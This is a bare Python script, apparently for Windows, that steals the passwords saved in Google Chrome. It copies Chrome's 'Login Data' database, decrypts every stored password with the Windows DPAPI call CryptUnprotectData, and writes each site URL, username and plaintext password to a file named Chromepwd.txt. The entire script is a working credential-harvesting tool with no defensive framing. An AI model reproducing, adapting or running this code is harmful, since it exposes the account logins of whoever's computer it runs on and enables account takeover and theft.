import shutil
import os,sys
import sqlite3
import win32crypt
import os.path
path = os.getcwd()
outFile=os.path.join(path,'Chromepwd.txt')
if os.path.exists(outFile):
    os.remove(outFile)
dbFile = os.path.join(os.environ['LOCALAPPDATA'],
                'Google/Chrome/User Data/Default/Login Data')
tmpFile = os.path.join(path,'tmp')
if os.path.exists(tmpFile):
    os.remove(tmpFile)
shutil.copyfile(dbFile,tmpFile)
conn = sqlite3.connect(tmpFile)
sql = 'select origin_url,action_url,username_value,password_value,signon_realm from logins'
with open(outFile,'wb') as f:
    for row in conn.execute(sql):
        pwdHash = str(row[3])
        try:
            ret = win32crypt.CryptUnprotectData(pwdHash,None,None,None,0)
        except:
            print('fail to decrypt chrome pwd')
            sys.exit(-1)
        f.write('origin_url: {0:<20} action_url: {1:<20} UserName: {2:<20} Password: {3:<20} Site:{4} \n\n'.format(
                row[0].encode('utf-8'),
                row[1].encode('utf-8'),
                row[2].encode('utf-8'),
                ret[1].encode('utf-8'),
                row[4].encode('utf-8'),
                ))
conn.close()
os.remove(tmpFile)